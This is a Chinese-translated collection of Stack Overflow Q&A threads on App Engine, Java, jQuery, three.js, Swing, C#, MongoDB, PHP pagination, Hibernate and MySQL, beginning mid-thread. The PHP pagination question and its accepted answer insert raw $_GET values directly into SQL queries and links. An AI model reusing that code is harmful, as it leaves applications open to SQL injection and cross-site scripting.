编辑：在提供的答案中提出建议后，我也意识到 GAE 不支持 Python 3.3 版，我在我的问题的前一部分中尝试使用它来运行它。在卸载 Python33 并改为安装 Python27，更改我的系统变量以反映新的 Python27 之后，我仍然遇到问题，并且我的代码无法使用 GAE 启动器上传。我在我的日志控制台（GAE 启动器）中收到以下错误：

```
2013-04-14 22:59:19 Running command: "['C:\\Python27\\pythonw.exe', 'C:\\Program Files (x86)\\Google\\google_appengine\\dev_appserver.py', '--skip_sdk_update_check=yes', '--port=8080', '--admin_port=8001', 'C:\\Users\\Karen\\Desktop\\Development\\projects\\file']"
Traceback (most recent call last):
  File "C:\Program Files (x86)\Google\google_appengine\dev_appserver.py", line 193, in     <module>
    _run_file(__file__, globals())
  File "C:\Program Files (x86)\Google\google_appengine\dev_appserver.py", line 189, in _run_file
    execfile(script_path, globals_)
  File "C:\Program Files     (x86)\Google\google_appengine\google\appengine\tools\devappserver2\devappserver2.py", line 30, in <module>
    from google.appengine.datastore import datastore_stub_util
  File "C:\Program Files     (x86)\Google\google_appengine\google\appengine\datastore\datastore_stub_util.py", line 45,     in <module>
    from google.appengine.api import api_base_pb
  File "C:\Program Files     (x86)\Google\google_appengine\google\appengine\api\api_base_pb.py", line 20, in <module>
    from google.net.proto import ProtocolBuffer
  File "C:\Program Files (x86)\Google\google_appengine\google\net\proto\ProtocolBuffer.py", line 22, in <module>
    import httplib
  File "C:\Python27\lib\httplib.py", line 71, in <module>
    import socket
  File "C:\Python27\lib\socket.py", line 47, in <module>
    import _socket
ImportError: Module use of python25.dll conflicts with this version of Python.
2013-04-14 22:59:21 (Process exited with code 1) 
```

感谢您为我提供的任何帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T12:46:27.173

您不应该安装 webapp2。它包含在 SDK 中，并且已经在生产运行时中。

阅读配置作为 appengine 环境一部分的库[https://developers.google.com/appengine/docs/python/python25/migrate27#Configuring_Libraries](https://developers.google.com/appengine/docs/python/python25/migrate27#Configuring_Libraries)

这是包含的第 3 方库的列表。

[https://developers.google.com/appengine/docs/python/tools/libraries27](https://developers.google.com/appengine/docs/python/tools/libraries27)

如果您将 pip/easy_install 用于其他各种库，您会发现它本身是不够的。您需要在项目中链接或包含这些库，操作 sys.path 以便可以找到它们，并确保已部署这些库。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-30T07:12:38.727

这解决了我的问题（同样的问题）

首先不要尝试从 python IDLE 运行从谷歌应用引擎运行打开 localhost:port

如果仍然显示相同的错误，请在 GAE 中打开登录，请尝试以下步骤

1.  检查您的 python 版本 2.7.X 或 3.X
2.  如果 3.x 安装 2.7.8
3.  然后打开谷歌应用引擎控制台并转到编辑>首选项
4.  将您的 python27 目录（例如：C:\Python27\pythonw.exe）添加到 PythonPath 单击确定

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-07-17T05:26:20.190

看起来[appengine/tools/devappserver2/python/sandbox.py](https://github.com/GoogleCloudPlatform/python-compat-runtime/blob/2791292e0abeeeefda4ba8c37d36491be887cd84/appengine-compat/exported_appengine_sdk/google/appengine/tools/devappserver2/python/sandbox.py#L373)应该`C:\path\to\google_appengine\google`变成`C:\path\to\google_appengine`.，但是有一个额外的目录名，所以它最终得到`C:\path\to`. 我不确定为什么它只会在某些情况下引起问题。

您可以通过更改来解决此问题：

```
library_pattern = os.path.join(os.path.dirname(
    os.path.dirname(google.__file__)), _THIRD_PARTY_LIBRARY_FORMAT_STRING) 
```

至：

```
library_pattern = os.path.join(
    os.path.dirname(google.__file__), _THIRD_PARTY_LIBRARY_FORMAT_STRING) 
```

`raise Exception(sys.path)`我通过在应用程序引擎代码中的各个位置并重新启动开发服务器发现了这个问题。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2013-04-14T12:32:19.563

您可以使用 pip 或 easy_install 安装 webapp2。请参阅[http://webapp-improved.appspot.com/tutorials/quickstart.nogae.html](http://webapp-improved.appspot.com/tutorials/quickstart.nogae.html)快速了解

# java - 如何在Java中为数据库提供相对路径

> ID：15998802
> 
> 赞同：0
> 
> 时间：2013-04-14T11:58:46.343
> 
> 标签：java, database, jdbc, path, relative-path

我想问一下如何在 java 中为数据库（ms 访问）提供相对路径，这样当我将项目放在其他驱动器中时，我就不必编辑路径部分。

下面给出的是数据库的绝对路径：

```
con=DriverManager.getConnection( "jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};**DBQ=c:\\project\\a.mdb"** ); 
```

但是如果我将我的项目更改为另一个文件夹，假设 d: 那么我必须像这样编辑这个路径部分：

```
con=DriverManager.getConnection( "jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=**d:\\project\\a.mdb"** ); 
```

我想提供一个相对路径，以便我的项目可以在任何具有此 \project\a.mdb 的驱动器上运行

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:10:41.393

嗯，这就是我们所说的*参数化*！只需将路径作为参数，并在运行时传递。这是一个演示：

```
public class DBOperation {
    public static void main(String[] args) {
     String path=args[0];
     String url="jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};**DBQ="+path+"**)";
     ...
    }
} 
```

并通过以下方式运行程序：

```
java DBOperation c:\project\a.mdb 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T12:09:26.177

我不知道您使用的驱动程序在使用路径时有多灵活（从未使用过该驱动程序）。但是解决它的一种方法是允许路径是可配置的，或者作为启动命令行参数，或者作为环境变量或系统属性。

您还可以确保数据库位于类路径中，并通过使用`getResource`它将为您提供数据库的 URL 来找到它的位置。然后可以使用它来将其转换为文件路径。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T12:12:55.373

AFAIK，如果您省略路径名的驱动器名称部分，Windows 应用程序将在“当前”驱动器上查找。

因此，请尝试将您使用的路径名从 更改`"d:\\project\\a.mdb"`为`"\\project\\a.mdb"`。

但是请注意，这意味着您需要在启动应用程序之前设置当前驱动器；例如键入`D:`或`C:`在命令提示符下。

* * *

更好的选择是使数据库路径成为命令行参数或属性文件中的条目或其他内容。

# jquery - 在jquery中绑定滚动事件的正确方法

> ID：15998806
> 
> 赞同：0
> 
> 时间：2013-04-14T11:59:17.173
> 
> 标签：jquery, scroll, jquery-on

我有一段简单的代码，我正在努力弄清楚为什么我的滚动事件没有被绑定。[这](http://codepen.io/anon/pen/JiEol)是一个 codepen 链接，我也会在这里发布代码：

HTML：

```
<div class="aaa"></div> 
```

CSS：

```
div.xxx
{
    height:100px;
    overflow:scroll;
    width:100px;
} 
```

Javascript（包括jQuery）：

```
$("*").on("scroll", function (event)
{
    alert("scrolled!");
    console.log("scroll");
});

$(document).ready(function() 
{
    $(".aaa").html('<div class="xxx">this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/></div>');     
}); 
```

我想要做的是触发任何滚动事件（嗯，特别是 div.xxx 中的滚动）但是如果我让它动态加载代码，它就不起作用。

PS我也尝试过使用live，但显然它已经过时并且甚至不支持live。所以我别无选择。

**PS我更新了我的codepen示例以显示该`click`事件有效，而即使它们以相同的方式编写，滚动一个也不会。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:05:07.497

您的代码的问题是您在应用程序开始时分配了侦听器，并且侦听器分配运行一次，并分配给他们找到的每个元素，仅此而已。

只有在这个阶段之后，你才真正添加你的 div，那是不被听的。

解决方案是在添加新内容后添加侦听器。

为此，您应该使用类似于以下 javascript 的内容

```
// declare a listener method, don't assign it yet to any element
var scrolled = function (event) {
  // just a nicer way of notification (instead of alert)
  var s = $('.scroll');
  s.fadeIn(500, function(){
    s.fadeOut(200);
  });
};

$(document).ready(function() {   
    // element used to notify the user of scroll
    $('body').append('<div class="scroll" style="display: none">scrolled</div>');
    $(".aaa").html('<div class="xxx">this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/>this<br/></div>')
             .children('.xxx') // select the newly added container
             .on("scroll", scrolled); // add the method above as a scroll listener
}); 
```

这样，您每次添加新内容时都会添加滚动侦听器。所以新的 div 将被收听。

**[工作示例](http://codepen.io/anon/pen/lfrkC)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T12:04:50.263

改变：

```
div.xxx
{
    height:100px;
    overflow:scroll;
    width:100px;
} 
```

至：

```
div.aaa
{
    height:100px;
    overflow:scroll;
    width:100px;
} 
```

没有带类的 div`xxx`

**[更新的演示](http://jsfiddle.net/HfbwJ/1/)**

# javascript - 三.js多重聚光灯性能

> ID：15998811
> 
> 赞同：4
> 
> 时间：2013-04-14T12:00:15.663
> 
> 标签：javascript, performance, three.js, webgl

我在three.js上做一些赛车游戏，我遇到了以下问题......

我有 2 辆车，所以我们需要为每辆车的后车灯和前车灯渲染 4 个聚光灯（最少）...

我们还需要一些路灯...

所以我有这个代码：

```
//front car1 light
var SpotLight = new THREE.SpotLight( 0xffffff, 5, 300, Math.PI/2, 1 );
SpotLight.position.set( 50, 10, 700 );
SpotLight.target.position.set(50, 0, 800);
SpotLight.castShadow = true;
SpotLight.shadowCameraVisible = false;
SpotLight.shadowDarkness = 0.5;
scene.add(SpotLight);

//front car2 light
var SpotLight = new THREE.SpotLight( 0xffffff, 5, 300, -Math.PI/2, 1 );
SpotLight.position.set( -50, 10, 40 );
SpotLight.target.position.set(-50, 0, 100);
SpotLight.castShadow = true;
SpotLight.shadowCameraVisible = false;
SpotLight.shadowDarkness = 0.5;
scene.add(SpotLight);

//rear car1 light
var SpotLight = new THREE.SpotLight( 0xff0000, 2, 200, Math.PI/2, 2 );
SpotLight.position.set( 50, 20, 660 );
SpotLight.target.position.set(50, 0, 600);
SpotLight.castShadow = true;
SpotLight.shadowCameraVisible = false;
SpotLight.shadowDarkness = 0.5;
scene.add(SpotLight);

//rear car2 light
var SpotLight = new THREE.SpotLight( 0xff0000, 2, 100, Math.PI/2, 1 );
SpotLight.position.set( -50, 20, -35 );
SpotLight.target.position.set(-50, 0, -100);
SpotLight.castShadow = true;
SpotLight.shadowCameraVisible = false;
SpotLight.shadowDarkness = 0.5;
scene.add(SpotLight);

//some road light
var SpotLight = new THREE.SpotLight( 0x404040, 3, 500, Math.PI/2, 2 );
SpotLight.position.set( 0, 300, 0 );
SpotLight.target.position.set(0, 0, 0);
SpotLight.castShadow = true;
SpotLight.shadowCameraVisible = false;
SpotLight.shadowDarkness = 0.5;
scene.add(SpotLight); 
```

没什么特别的.. 但是性能下降到 20-30 FPS 并且有点滞后 :-1: 如果我将来添加一些灯光，性能会进一步提升......

有没有人遇到过类似的问题？如何处理？或者也许我做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T12:13:45.010

进行实时渲染时，灯光非常消耗。您需要找到最便宜的方法来模仿您所追求的结果。

例如，您可以在您的汽车前面有一个纹理平面，其纹理看起来就像有聚光灯对准地板。这不会是正确的，但它会给人一种正确的印象，您将节省 4 个聚光灯，您的游戏将以 60fps 运行。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-14T14:42:06.157

在这种情况下，阴影很可能是罪魁祸首 - 在引擎盖下，需要从每个投射阴影的灯光的角度来渲染场景。如果可能，将它们保存为最重要的，禁用其他灯光上的阴影。

对于许多灯光，您可以尝试使用 WebGLDeferredRenderer，它可以比默认渲染器更好地处理多个灯光。不过，这是一项正在进行的实验性工作，因此您可能会遇到其他问题。另外我不确定它是否有助于阴影映射性能。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-18T17:31:25.380

除了 mrdoob 和 yaku 的建议之外，我遇到了完全相同的问题，这真的很有帮助，另一种方法是减少几何中的段和多边形的数量。

即如果您的场景中有一个简单的圆柱体，您可以通过在初始化时分配 heightSegments 和radialSegments 来减少段数：

作为一个非常简单的示例，如果您需要创建一个简单的圆柱体，请避免执行以下操作：

```
sampleCylinderGeo = new THREE.CylinderGeometry(2, 2, 5, 16, 32); 
```

而是尝试：

```
sampleCylinderGeo = new THREE.CylinderGeometry(2, 2, 5, 8, 1); 
```

当然，如果您想要更平滑的圆柱体，您可以根据需要将径向段从 8 个增加到 16 个或更多，但是对于 heightSegments，在一个简单的圆柱体中拥有超过 1 个段根本没有用。

因此，只需根据您的需要调整分段数量，这样您就可以节省大量不必要的分段并在使用灯光时实现更多的 FPS，特别是当您的场景中有大量几何图形时。

# java - NullPointerException，杀死了我的程序

> ID：15998813
> 
> 赞同：3
> 
> 时间：2013-04-14T12:00:34.947
> 
> 标签：java, swing, nullpointerexception, jcombobox

我正在尝试创建从组合框中选择时显示颜色的小框。但是当我尝试运行程序时，我不断收到 NullPointerException 错误。我看不出它有什么问题。

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class ThreeColorsFrame extends JFrame
{
    private static final int FRAME_WIDTH = 300;
    private static final int FRAME_HEIGHT = 400;

    private JComboBox box;
    private JLabel picture;

    private static String[] filename = { "Red", "Blue", "Green" };
    private Icon[] pics = { new ImageIcon(getClass().getResource(filename[0])),
                    new ImageIcon(getClass().getResource(filename[1])),
                    new ImageIcon(getClass().getResource(filename[2])) };

    public ThreeColorsFrame()
    {
        super("ThreeColorsFrame");
        setLayout(new FlowLayout());

        box = new JComboBox(filename);

        box.addItemListener(new ItemListener()
        {
            public void itemStateChanged(ItemEvent event)
            {
                if (event.getStateChange() == ItemEvent.SELECTED)
                    picture.setIcon(pics[box.getSelectedIndex()]);
            }
        });

        add(box);
        picture = new JLabel(pics[0]);
        add(picture);

    }

}

Exception in thread "main" java.lang.NullPointerException
    at javax.swing.ImageIcon.<init>(Unknown Source)
    at ThreeColorsFrame.<init>(ThreeColorsFrame.java:33)
    at ThreeColorsViewer.main(ThreeColorsViewer.java:36) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T12:05:55.440

你的问题是你还没有初始化`picture`。你有

```
private JLabel picture; 
```

但这从未设置过：

```
 picture.setIcon(...); 
```

在构造函数中调用，尽管是在一个条件内。

你需要初始化它，例如

```
picture = new JLabel(...); // whatever 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T12:10:10.803

`picture`您在初始化对象之前正在使用它。

**利用**

```
picture.setIcon(pics[box.getSelectedIndex()]); 
```

**初始化**

```
picture = new JLabel(pics[0]); 
```

将初始化语句移到侦听器上方。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T05:57:21.193

`picture`我会在您声明后立即尝试初始化。

因此，不要使用`private JLabel picture;`尝试使用：

`private JLabel picture = new JLabel(pics[0]);`

# c# - C# 更改 DataGridView 单元格类型（错误？）

> ID：15998817
> 
> 赞同：0
> 
> 时间：2013-04-14T12:00:55.760
> 
> 标签：c#, datagridview

我有一个链接到 DataTable 的 DataGridView。表格中的单元格设置为十进制。

在没有相关数据的情况下，我希望在“power”列（#2）中使用“No Data”文本而不是值。

为此，我执行以下操作：

```
foreach (DataGridViewRow row in resultsDataGrid.Rows)
  if ((int)row.Cells["DataYN"].Value == 1)
  {
    row.Cells["Power"].ValueType = typeof(String);  
    row.Cells["Power"].Value = "No Data";  
  } 
```

编译时，我收到一条错误消息““*无数据”不是十进制的有效值*....'。

单元格值类型已明确设置并显示为字符串，但编译器认为它仍然是十进制。我尝试了各种铸造和转换，但无济于事。

1.  这是编译器错误吗？
2.  有解决方法吗？

萨塔尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T16:53:22.663

与其实际尝试更改单元格的值，不如将“无数据”指定为单元格默认样式的 NullValue 属性（[http://msdn.microsoft.com/en-us/library/system.windows.forms .datagridviewcellstyle.nullvalue.aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.datagridviewcellstyle.nullvalue.aspx)）。这将消除循环数据的需要，并应防止网格尝试将值转换为小数。

# mongodb - Mongodb 在副本集中回滚

> ID：15998819
> 
> 赞同：-22
> 
> 时间：2013-04-14T12:01:13.800
> 
> 标签：mongodb

假设您有一个三节点副本集。节点 1 是主节点。节点 2 是辅助节点，节点 3 是辅助节点，运行延迟 10 秒。所有对数据库的写入都以 w=majority 和 j=1 发出（我们的意思是 getLastError 调用设置了这些值）。

在 time=0 时从您的应用程序启动写入操作（可以是插入或更新）。在 time=5 秒时，主节点节点 1 停机一个小时，另一个节点被选为主节点。

节点 1 恢复时是否会回滚数据？选择最佳答案。

1.  总是是的
2.  总是没有
3.  也许，这取决于节点 3 是否处理了写入。
4.  也许，这取决于节点 2 是否处理了写入。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-15T07:05:56.507

我将把我的答案改为 4，但它应该是 2，且 aw=majority。您可能有一个边缘情况，即`wtimeout`返回一个操作并且该操作没有得到大多数集合的确认。这些问题应该非常罕见或几乎不会发生，但要记住一些事情。

由于大多数节点（1 和 2）将确认写入，如果节点 1 发生故障，节点 2 应该有它的操作并达到最高速度，因为节点 1 不需要回滚到节点 2 的状态；相反，节点 1 将迎头赶上。

日志对于定义回滚是否存在并不那么重要。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-02-23T07:36:41.470

请阅读 MongoDB 文档的相关摘录：“如果写操作在主要步骤关闭***之前***复制到副本集的另一个成员，并且该成员仍然可用并且可供大多数副本集访问，**则不会发生回滚。”**

 ** * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-07-14T02:57:03.563

我认为这是 Mongo DB 考试中的一个问题，但答案很容易看出：

> 也许，这取决于节点 2 是否处理了写入。*

# php - 当您有条件选择数据时，页面的 PHP/MySQL 分页

> ID：15998820
> 
> 赞同：0
> 
> 时间：2013-04-14T12:01:17.823
> 
> 标签：php, mysql, pagination, conditional-statements

我正在尝试为我的索引页进行分页。索引页面显示来自数据库的数据，其中一些条件来自 url。编辑：这是整个代码：

```
 $town = $_GET['label_town'];
$sub = ucfirst($_GET['label_sub']);

if (isset($_GET['label_town']) === true && isset($_GET['label_sub']) === true) {
$where = "WHERE p.label_town = '$town' AND p.label_sub = '$sub' AND `visible` = 1";
} else if (isset($_GET['label_town']) === true && isset($_GET['label_sub']) === false) {
$where = "WHERE p.label_town = '$town' AND `visible` = 1";
} else {
$where = "WHERE `visible` = 1";
}

$adjacents = 3;

$query = "SELECT COUNT(p.page_id) as num FROM `data_page` AS p $where";
$total_pages = mysql_fetch_array(mysql_query($query));
$total_pages = $total_pages[num];

$targetpage = "index.php";
$limit = 1;

//how many items to show per page
    $page = $_GET['page'];
    if(isset($page)) { 
        $start = ($page - 1) * $limit;  //first item to display on this page
    } else {
        $start = 0; //if no page var is given, set start to 0
    }
// Example ##1##
$all_page_index = mysql_query("SELECT p.page_id, p.timestamp, p.label_town, p.label_sub, p.ime_nekretnine, p.mjesto, p.cijena_noc, p.krevet_apart, p.broj_apart, p.min_nocenja, p.description, p.visits, i.image_id, i.page_id, i.ext
FROM data_page AS p
LEFT JOIN (
SELECT MAX( image_id ) AS max, page_id
FROM images
GROUP BY page_id
) AS n ON p.page_id = n.page_id
LEFT JOIN images AS i ON i.image_id = n.max
$where
ORDER BY p.page_id DESC
LIMIT $start, $limit");

if ($page == 0) $page = 1;                  //if no page var is given, default to 1.
    $prev = $page - 1;                          //previous page is page - 1
    $next = $page + 1;                          //next page is page + 1
    $lastpage = ceil($total_pages/$limit);      //lastpage is = total pages / items per page, rounded up.
    $lpm1 = $lastpage - 1;                      //last page minus 1

    /* 
        Now we apply our rules and draw the pagination object. 
        We're actually saving the code to a variable in case we want to draw it more than once.
    */
    $pagination = "";
    if($lastpage > 1)
    {   
        $pagination .= "<div class=\"pagination\">";
        //previous button
        if ($page > 1) 
            $pagination.= "<a href=\"$targetpage?page=$prev\">&lsaquo;&lsaquo; previous</a>";
        else
            $pagination.= "<span class=\"disabled\">&lsaquo;&lsaquo; previous</span>";  

        //pages 
        if ($lastpage < 7 + ($adjacents * 2))   //not enough pages to bother breaking it up
        {   
            for ($counter = 1; $counter <= $lastpage; $counter++)
            {
                if ($counter == $page)
                    $pagination.= "<span class=\"current\">$counter</span>";
                else
                    $pagination.= "<a href=\"$targetpage?page=$counter\">$counter</a>";                 
            }
        }
        elseif($lastpage > 5 + ($adjacents * 2))    //enough pages to hide some
        {
            //close to beginning; only hide later pages
            if($page < 1 + ($adjacents * 2))        
            {
                for ($counter = 1; $counter < 4 + ($adjacents * 2); $counter++)
                {
                    if ($counter == $page)
                        $pagination.= "<span class=\"current\">$counter</span>";
                    else
                        $pagination.= "<a href=\"$targetpage?page=$counter\">$counter</a>";                 
                }
                $pagination.= "...";
                $pagination.= "<a href=\"$targetpage?page=$lpm1\">$lpm1</a>";
                $pagination.= "<a href=\"$targetpage?page=$lastpage\">$lastpage</a>";       
            }
            //in middle; hide some front and some back
            elseif($lastpage - ($adjacents * 2) > $page && $page > ($adjacents * 2))
            {
                $pagination.= "<a href=\"$targetpage?page=1\">1</a>";
                $pagination.= "<a href=\"$targetpage?page=2\">2</a>";
                $pagination.= "...";
                for ($counter = $page - $adjacents; $counter <= $page + $adjacents; $counter++)
                {
                    if ($counter == $page)
                        $pagination.= "<span class=\"current\">$counter</span>";
                    else
                        $pagination.= "<a href=\"$targetpage?page=$counter\">$counter</a>";                 
                }
                $pagination.= "...";
                $pagination.= "<a href=\"$targetpage?page=$lpm1\">$lpm1</a>";
                $pagination.= "<a href=\"$targetpage?page=$lastpage\">$lastpage</a>";       
            }
            //close to end; only hide early pages
            else
            {
                $pagination.= "<a href=\"$targetpage?page=1\">1</a>";
                $pagination.= "<a href=\"$targetpage?page=2\">2</a>";
                $pagination.= "...";
                for ($counter = $lastpage - (2 + ($adjacents * 2)); $counter <= $lastpage; $counter++)
                {
                    if ($counter == $page)
                        $pagination.= "<span class=\"current\">$counter</span>";
                    else
                        $pagination.= "<a href=\"$targetpage?page=$counter\">$counter</a>";                 
                }
            }
        }
        //next button
        if ($page < $counter - 1) 
            $pagination.= "<a href=\"$targetpage?page=$next\">next &rsaquo;&rsaquo;</a>";
        else
            $pagination.= "<span class=\"disabled\">next &rsaquo;&rsaquo;</span>";
        $pagination.= "</div>\n";       
    }
?> 
<?php include "widgets/header.php"; ?>
<?php include "widgets/left_side.php"; ?>
<div class="middle">
<h2>Crnogorsko primorje<?php if(!empty($_GET['label_town'])) { echo ' - ' . $town; } ?></h2>
<?php if (mysql_num_rows($all_page_index) > 0) {

    while ($rowAllPage = mysql_fetch_array($all_page_index)) { ?>

    // Here is my loop, I remove code. It's too big.
}
}
?>

<?=$pagination?> 
```

代码没有错误。在 index.php 页面上一切正常，但问题是 $targetpage = "index.php"。当我有条件 url "index.php?label_town=bar&label_sub=apartmani" 并且当我点击分页号浏览器时将我重定向到 index.php?page=somenumber。我尝试使用 $_SERVER['HTTP_REFERER'] 但它加倍 page=somenumber 我也尝试

```
$targetpage = strtok($_SERVER['QUERY_STRING'], "page"); 
```

但这也行不通。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T14:36:43.603

行！我以这种方式解决了一个问题。如果有人有更好的解决方案，请分享。

这是我的。在 if else 语句中，我添加了具有不同值的 $targetpage：

```
if (isset($_GET['label_town']) === true && isset($_GET['label_sub']) === true) {
$where = "WHERE p.label_town = '$town' AND p.label_sub = '$sub' AND `visible` = 1"; 
$targetpage = "index.php?label_town=$town&label_sub=$sub&";
} else if (isset($_GET['label_town']) === true && isset($_GET['label_sub']) === false) {
$where = "WHERE p.label_town = '$town' AND `visible` = 1";
$targetpage = "index.php?label_town=$town&";
} else {
$where = "WHERE `visible` = 1";
$targetpage = "index.php?";
} 
```

比对每个动态链接进行更改，如下所示：

```
$pagination.= "<a href=\"$targetpage?page=$counter\">$counter</a>"; 
```

有了这个：

```
$pagination.= "<a href=\"" . $targetpage ."page=$counter\">$counter</a> 
```

# java - 映射集 使用@ElementCollection

> ID：15998824
> 
> 赞同：26
> 
> 时间：2013-04-14T12:01:41.507
> 
> 标签：java, hibernate, jpa, enums, set

我有以下枚举：

```
package ir.raysis.tcs.rule.days;

public enum Days {
    SUNDAY, MONDAY, TUESDAY, WEDNESDAY,
    THURSDAY, FRIDAY, SATURDAY;
} 
```

我试图将其映射为`Set<Days>`天，如下所示：

```
@ElementCollection(targetClass = Days.class) 
@JoinTable(name = "days",joinColumns = @JoinColumn(name = "rule_id")) 
@Column(name ="daysOfWeek", nullable = false) @Enumerated(EnumType.STRING) 
private Set<Days> days = new HashSet<>(); 
```

但是，它会引发以下异常：

```
Initial SessionFactory creation failed.org.hibernate.MappingException: Could not determine type for: java.util.Set, at table: rule, for columns: [org.hibernate.mapping.Column(days)]
Apr 14, 2013 4:15:17 PM org.apache.catalina.core.StandardWrapperValve invoke
SEVERE: Servlet.service() for servlet [jsp] in context with path [/ptcs] threw exception [javax.servlet.ServletException: java.lang.ExceptionInInitializerError] with root cause
org.hibernate.MappingException: Could not determine type for: java.util.Set, at table: rule, for columns: [org.hibernate.mapping.Column(days)]
    at org.hibernate.mapping.SimpleValue.getType(SimpleValue.java:306)
    at org.hibernate.mapping.SimpleValue.isValid(SimpleValue.java:290)
    at org.hibernate.mapping.Property.isValid(Property.java:217)
    at org.hibernate.mapping.PersistentClass.validate(PersistentClass.java:464)
    at org.hibernate.mapping.RootClass.validate(RootClass.java:235)
    at org.hibernate.cfg.Configuration.validate(Configuration.java:1362)
    at org.hibernate.cfg.Configuration.buildSessionFactory(Configuration.java:1865)
    at ir.raysis.tcs.db.HibernateUtil.<clinit>(HibernateUtil.java:18)
    at ir.raysis.tcs.db.SaveUpadteDelete.save(SaveUpadteDelete.java:33)
    at ir.raysis.tcs.db.dBAllFunc.save(dBAllFunc.java:35)
    at ir.raysis.tcs.db.AbsDBObject.save(AbsDBObject.java:45)
    at ir.raysis.tcs.action.CreateMemberAction.execute(CreateMemberAction.java:31)
    at org.apache.jsp.action.createMember_jsp._jspService(createMember_jsp.java:79)
    at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
    at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
    at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:225)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1001)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579)
    at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:1770)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
    at java.lang.Thread.run(Unknown Source) 
```

我如何正确映射它？

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2013-04-15T11:44:17.423

为未来的谷歌人！最后我设法解决了这个问题，我只需将注释放在我的代码中的其他地方，

```
@ElementCollection(targetClass = Days.class)
@CollectionTable(name = "days", joinColumns = @JoinColumn(name = "rule_id"))
@Column(name = "daysOfWeek", nullable = false)
@Enumerated(EnumType.STRING)
public Set<Days> getDays() {
    return days;
} 
```

如您所见，我在上面和 getter 方法之前编写了注释代码（而不是将其放在属性声明代码之前）并解决了问题，任何能解释我原因的人将不胜感激。谢谢你

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-14T12:31:32.403

尝试使用`@CollectionTable`而不是`@JoinTable`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2020-08-04T12:27:18.387

虽然另一个问题是正确的，但最简单的形式可能是：

```
@ElementCollection
@Enumerated
private Set<EnumName> enumValues; 
```

其他所有内容都将按照配置（连接表名称，列）的约定进行设置。

我强烈建议使用`@Enumerated(EnumType.STRING)`- 查找原因。你可能需要`@ElementCollection(fetch = FetchType.EAGER)`根据你在做什么（和在哪里）。

# mysql - 如何在 mysql 语句中创建多个计数

> ID：15998827
> 
> 赞同：0
> 
> 时间：2013-04-14T12:01:48.627
> 
> 标签：mysql, join, count

在 mysql 语句中计算超过 2 个计数时我遇到了一些麻烦。

我的 `count(b.entry_id) as totalbooking`不会工作。我做错了什么？语句设置也正确吗？​​​​

这就是我尝试的方式：

```
"SELECT 
    t.restaurant_id as restaurant_id, ct.title as title, 
    count(DISTINCT t.cardid) as totalmembers, 
    count(t.restaurant_id) as totaltransactions, 
    count(b.entry_id) as totalbooking
    from transactions as t   
    inner join exp_menucard_booking as b on (t.restaurant_id = b.entry_id)
    inner join exp_channel_titles as ct on (t.restaurant_id = ct.entry_id)
    inner JOIN exp_channel_data as cd on (ct.entry_id = cd.entry_id)
    where t.cardid != 88888888 and ct.status = 'open'
    group by t.restaurant_id
